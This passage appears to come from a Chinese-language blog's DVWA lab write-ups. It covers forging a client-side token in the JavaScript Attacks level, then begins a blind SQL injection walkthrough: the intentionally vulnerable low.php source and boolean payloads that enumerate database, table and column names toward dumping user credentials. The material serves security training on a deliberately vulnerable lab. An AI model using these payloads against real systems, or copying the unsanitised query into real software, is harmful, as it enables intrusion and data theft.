constant_">HEX_CHARS</span>[h1 &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[h2 &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[h3 &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[h4 &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[h5 &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[h6 &amp; <span class="number">0x0F</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">is224</span>) {</span><br><span class="line">            hex += <span class="variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[h7 &amp; <span class="number">0x0F</span>]</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> hex</span><br><span class="line">    };</span><br><span class="line">    <span class="title class_">Sha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span> = <span class="title class_">Sha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hex</span>;</span><br><span class="line">    <span class="title class_">Sha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">digest</span> = <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">finalize</span>();</span><br><span class="line">        <span class="keyword">var</span> h0 = <span class="variable language_">this</span>.<span class="property">h0</span>,</span><br><span class="line">            h1 = <span class="variable language_">this</span>.<span class="property">h1</span>,</span><br><span class="line">            h2 = <span class="variable language_">this</span>.<span class="property">h2</span>,</span><br><span class="line">            h3 = <span class="variable language_">this</span>.<span class="property">h3</span>,</span><br><span class="line">            h4 = <span class="variable language_">this</span>.<span class="property">h4</span>,</span><br><span class="line">            h5 = <span class="variable language_">this</span>.<span class="property">h5</span>,</span><br><span class="line">            h6 = <span class="variable language_">this</span>.<span class="property">h6</span>,</span><br><span class="line">            h7 = <span class="variable language_">this</span>.<span class="property">h7</span>;</span><br><span class="line">        <span class="keyword">var</span> arr = [(h0 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (h0 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (h0 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, h0 &amp; <span class="number">0xFF</span>, (h1 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (h1 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (h1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, h1 &amp; <span class="number">0xFF</span>, (h2 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (h2 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (h2 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, h2 &amp; <span class="number">0xFF</span>, (h3 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (h3 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (h3 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, h3 &amp; <span class="number">0xFF</span>, (h4 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (h4 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (h4 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, h4 &amp; <span class="number">0xFF</span>, (h5 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (h5 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (h5 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, h5 &amp; <span class="number">0xFF</span>, (h6 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (h6 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (h6 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, h6 &amp; <span class="number">0xFF</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">is224</span>) {</span><br><span class="line">            arr.<span class="title function_">push</span>((h7 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (h7 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (h7 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, h7 &amp; <span class="number">0xFF</span>)</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> arr</span><br><span class="line">    };</span><br><span class="line">    <span class="title class_">Sha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">array</span> = <span class="title class_">Sha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">digest</span>;</span><br><span class="line">    <span class="title class_">Sha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">arrayBuffer</span> = <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">finalize</span>();</span><br><span class="line">        <span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="variable language_">this</span>.<span class="property">is224</span> ? <span class="number">28</span> : <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">var</span> dataView = <span class="keyword">new</span> <span class="title class_">DataView</span>(buffer);</span><br><span class="line">        dataView.<span class="title function_">setUint32</span>(<span class="number">0</span>, <span class="variable language_">this</span>.<span class="property">h0</span>);</span><br><span class="line">        dataView.<span class="title function_">setUint32</span>(<span class="number">4</span>, <span class="variable language_">this</span>.<span class="property">h1</span>);</span><br><span class="line">        dataView.<span class="title function_">setUint32</span>(<span class="number">8</span>, <span class="variable language_">this</span>.<span class="property">h2</span>);</span><br><span class="line">        dataView.<span class="title function_">setUint32</span>(<span class="number">12</span>, <span class="variable language_">this</span>.<span class="property">h3</span>);</span><br><span class="line">        dataView.<span class="title function_">setUint32</span>(<span class="number">16</span>, <span class="variable language_">this</span>.<span class="property">h4</span>);</span><br><span class="line">        dataView.<span class="title function_">setUint32</span>(<span class="number">20</span>, <span class="variable language_">this</span>.<span class="property">h5</span>);</span><br><span class="line">        dataView.<span class="title function_">setUint32</span>(<span class="number">24</span>, <span class="variable language_">this</span>.<span class="property">h6</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">is224</span>) {</span><br><span class="line">            dataView.<span class="title function_">setUint32</span>(<span class="number">28</span>, <span class="variable language_">this</span>.<span class="property">h7</span>)</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> buffer</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">HmacSha256</span>(<span class="params">key, is224, sharedMemory</span>) {</span><br><span class="line">        <span class="keyword">var</span> i, type = <span class="keyword">typeof</span> key;</span><br><span class="line">        <span class="keyword">if</span> (type === <span class="string">'string'</span>) {</span><br><span class="line">            <span class="keyword">var</span> bytes = [],</span><br><span class="line">                length = key.<span class="property">length</span>,</span><br><span class="line">                index = <span class="number">0</span>,</span><br><span class="line">                code;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; ++i) {</span><br><span class="line">                code = key.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">                <span class="keyword">if</span> (code &lt; <span class="number">0x80</span>) {</span><br><span class="line">                    bytes[index++] = code</span><br><span class="line">                } <span class="keyword">else</span> <span class="keyword">if</span> (code &lt; <span class="number">0x800</span>) {</span><br><span class="line">                    bytes[index++] = (<span class="number">0xc0</span> | (code &gt;&gt; <span class="number">6</span>));</span><br><span class="line">                    bytes[index++] = (<span class="number">0x80</span> | (code &amp; <span class="number">0x3f</span>))</span><br><span class="line">                } <span class="keyword">else</span> <span class="keyword">if</span> (code &lt; <span class="number">0xd800</span> || code &gt;= <span class="number">0xe000</span>) {</span><br><span class="line">                    bytes[index++] = (<span class="number">0xe0</span> | (code &gt;&gt; <span class="number">12</span>));</span><br><span class="line">                    bytes[index++] = (<span class="number">0x80</span> | ((code &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>));</span><br><span class="line">                    bytes[index++] = (<span class="number">0x80</span> | (code &amp; <span class="number">0x3f</span>))</span><br><span class="line">                } <span class="keyword">else</span> {</span><br><span class="line">                    code = <span class="number">0x10000</span> + (((code &amp; <span class="number">0x3ff</span>) &lt;&lt; <span class="number">10</span>) | (key.<span class="title function_">charCodeAt</span>(++i) &amp; <span class="number">0x3ff</span>));</span><br><span class="line">                    bytes[index++] = (<span class="number">0xf0</span> | (code &gt;&gt; <span class="number">18</span>));</span><br><span class="line">                    bytes[index++] = (<span class="number">0x80</span> | ((code &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3f</span>));</span><br><span class="line">                    bytes[index++] = (<span class="number">0x80</span> | ((code &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>));</span><br><span class="line">                    bytes[index++] = (<span class="number">0x80</span> | (code &amp; <span class="number">0x3f</span>))</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            key = bytes</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">if</span> (type === <span class="string">'object'</span>) {</span><br><span class="line">                <span class="keyword">if</span> (key === <span class="literal">null</span>) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="variable constant_">ERROR</span>)</span><br><span class="line">                } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable constant_">ARRAY_BUFFER</span> &amp;&amp; key.<span class="property">constructor</span> === <span class="title class_">ArrayBuffer</span>) {</span><br><span class="line">                    key = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(key)</span><br><span class="line">                } <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="title class_">Array</span>.<span class="title function_">isArray</span>(key)) {</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable constant_">ARRAY_BUFFER</span> || !<span class="title class_">ArrayBuffer</span>.<span class="title function_">isView</span>(key)) {</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="variable constant_">ERROR</span>)</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="variable constant_">ERROR</span>)</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (key.<span class="property">length</span> &gt; <span class="number">64</span>) {</span><br><span class="line">            key = (<span class="keyword">new</span> <span class="title class_">Sha256</span>(is224, <span class="literal">true</span>)).<span class="title function_">update</span>(key).<span class="title function_">array</span>()</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">var</span> oKeyPad = [],</span><br><span class="line">            iKeyPad = [];</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i) {</span><br><span class="line">            <span class="keyword">var</span> b = key[i] || <span class="number">0</span>;</span><br><span class="line">            oKeyPad[i] = <span class="number">0x5c</span> ^ b;</span><br><span class="line">            iKeyPad[i] = <span class="number">0x36</span> ^ b</span><br><span class="line">        }</span><br><span class="line">        <span class="title class_">Sha256</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, is224, sharedMemory);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">update</span>(iKeyPad);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">oKeyPad</span> = oKeyPad;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">inner</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">sharedMemory</span> = sharedMemory</span><br><span class="line">    }</span><br><span class="line">    <span class="title class_">HmacSha256</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Sha256</span>();</span><br><span class="line">    <span class="title class_">HmacSha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">finalize</span> = <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="title class_">Sha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">finalize</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">inner</span>) {</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">inner</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">var</span> innerHash = <span class="variable language_">this</span>.<span class="title function_">array</span>();</span><br><span class="line">            <span class="title class_">Sha256</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="variable language_">this</span>.<span class="property">is224</span>, <span class="variable language_">this</span>.<span class="property">sharedMemory</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">update</span>(<span class="variable language_">this</span>.<span class="property">oKeyPad</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">update</span>(innerHash);</span><br><span class="line">            <span class="title class_">Sha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">finalize</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>)</span><br><span class="line">        }</span><br><span class="line">    };</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">exports</span> = <span class="title function_">createMethod</span>();</span><br><span class="line">    <span class="built_in">exports</span>.<span class="property">sha256</span> = <span class="built_in">exports</span>;</span><br><span class="line">    <span class="built_in">exports</span>.<span class="property">sha224</span> = <span class="title function_">createMethod</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">exports</span>.<span class="property">sha256</span>.<span class="property">hmac</span> = <span class="title function_">createHmacMethod</span>();</span><br><span class="line">    <span class="built_in">exports</span>.<span class="property">sha224</span>.<span class="property">hmac</span> = <span class="title function_">createHmacMethod</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">COMMON_JS</span>) {</span><br><span class="line">        <span class="variable language_">module</span>.<span class="property">exports</span> = <span class="built_in">exports</span></span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        root.<span class="property">sha256</span> = <span class="built_in">exports</span>.<span class="property">sha256</span>;</span><br><span class="line">        root.<span class="property">sha224</span> = <span class="built_in">exports</span>.<span class="property">sha224</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable constant_">AMD</span>) {</span><br><span class="line">            <span class="title function_">define</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">exports</span></span><br><span class="line">            })</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">})();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">do_something</span>(<span class="params">e</span>) {</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">""</span>, n = e.<span class="property">length</span> - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">}</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_3</span>(<span class="params">t, y = <span class="string">"ZZ"</span></span>) {</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"token"</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"token"</span>).<span class="property">value</span> + y)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_2</span>(<span class="params">e = <span class="string">"YY"</span></span>) {</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"token"</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(e + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"token"</span>).<span class="property">value</span>)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_1</span>(<span class="params">a, b</span>) {</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"token"</span>).<span class="property">value</span> = <span class="title function_">do_something</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"phrase"</span>).<span class="property">value</span>)</span><br><span class="line">}</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"phrase"</span>).<span class="property">value</span> = <span class="string">""</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="title function_">token_part_2</span>(<span class="string">"XX"</span>)</span><br><span class="line">}, <span class="number">300</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"send"</span>).<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, token_part_3);</span><br><span class="line"><span class="title function_">token_part_1</span>(<span class="string">"ABCD"</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure>

<p>核心代码主要是后面的几个函数；</p>
<p>几个函数调用顺序及生成token的步骤如下：</p>
<ol>
<li> 执行token_part_1()，取phrase值并进行字符串翻转处理；</li>
<li> 延迟300ms后执行token_part_2()，传入参数字符串<code>XX</code>和token值拼接并调用sha256()加密；</li>
<li> 点击按钮时执行token_part_3()，将token值和字符串<code>ZZ</code>拼接并调用sha256()加密，从而得到最终的token；</li>
</ol>
<p>先将转换过来的JS前一部分关于sha256算法定义代码输入实现初始化，方便后面直接调用sha256()；</p>
<p>在输入框输入 success 后，再到控制台中输入<code>token_part_1("ABCD", 44)</code>和<code>token_part_2("XX")</code>，再点击提交即可完成；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201124000108.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201124001912.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201124000141.png"></p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>前端直接表明不能相信不安全的输入，没有输入最安全呗；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201124002120.png"></p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>JavaScript Attacks</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA SQL Injection (Blind)</title>
    <url>/DVWA-SQL-Injection-Blind.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录学习DVWA中的SQL盲注过程，包括手工注入、SQLmap注入两部分。<span id="more"></span></p>
<p>目的：爆破数据库，通过SQL注入，找到dvwa网站所有的用户名及密码。</p>
<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># low.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'Submit'</span>])){</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="subst">$id</span>';"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>], <span class="variable">$getid</span>); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="variable">$num</span> = @<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) {</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="variable">$_SERVER</span>[<span class="string">'SERVER_PROTOCOL'</span>].<span class="string">' 404 Not Found'</span>);</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：直接拼接sql语句没有任何处理，查询结果只有<code>User ID exists in the database</code>和<code>User ID is MISSING from the database</code>。</p>
<h2 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h2><h3 id="注入判断"><a href="#注入判断" class="headerlink" title="注入判断"></a>注入判断</h3><ol>
<li> 输入<code>1' and 1=1;#</code>， 输出<code>User ID exists in the database</code></li>
<li> 输入<code>1' and 1=2;#</code>，输出<code>User ID is MISSING from the database</code></li>
</ol>
<p>判断为字符型注入；</p>
<h3 id="猜解当前数据库信息"><a href="#猜解当前数据库信息" class="headerlink" title="猜解当前数据库信息"></a>猜解当前数据库信息</h3><h4 id="猜解数据库长度"><a href="#猜解数据库长度" class="headerlink" title="猜解数据库长度"></a>猜解数据库长度</h4><p>输入<code>1' and length(database())=4;#</code>，返回<code>User ID exists in the database</code>，表明数据库名长度为4(这里需要不断尝试)；</p>
<h4 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h4><p>使用<strong>二分法</strong>猜解数据库名；</p>
<p>输入<code>1' and ascii(substr(database(),1,1)) &gt; 100;#</code>，输出<code>User ID is MISSING from the database</code></p>
<p>输入<code>1' and ascii(substr(database(),1,1)) &lt; 100;#</code>，输出<code>User ID is MISSING from the database</code></p>
<p>判断出数据库名的第一个ascii字符为100，就是d，按照以上方法猜解出数据库名dvwa；</p>
<h3 id="猜解表信息"><a href="#猜解表信息" class="headerlink" title="猜解表信息"></a>猜解表信息</h3><h4 id="猜解表数目"><a href="#猜解表数目" class="headerlink" title="猜解表数目"></a>猜解表数目</h4><p>输入<code>1' and (select count(table_name) from information_schema.tables where table_schema=database())=2;#</code>，返回<code>User ID exists in the database</code>，表明有两个数据表；</p>
<h4 id="猜解表长度"><a href="#猜解表长度" class="headerlink" title="猜解表长度"></a>猜解表长度</h4><p>输入<code>1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9; #</code>，返回<code>User ID exists in the database</code>，说明第一个表的长度为9；</p>
<h4 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h4><p>输入<code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103;#</code>，返回<code>User ID is MISSING from the database</code></p>
<p>输入<code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103;#</code>，返回<code>User ID is MISSING from the database</code></p>
<p>表明第一个表名的第一个字母是g；</p>
<p>按照上述操作，猜解出两个表名分别为 guestbook，users；</p>
<h3 id="猜解字段信息"><a href="#猜解字段信息" class="headerlink" title="猜解字段信息"></a>猜解字段信息</h3><h4 id="猜解字段数量"><a href="#猜解字段数量" class="headerlink" title="猜解字段数量"></a>猜解字段数量</h4><p>输入<code>1' and (select count(column_name) from information_schema.columns where table_name='users')=8;#</code>，输出<code>User ID exists in the database</code>，表明users表的字段数量为8；</p>
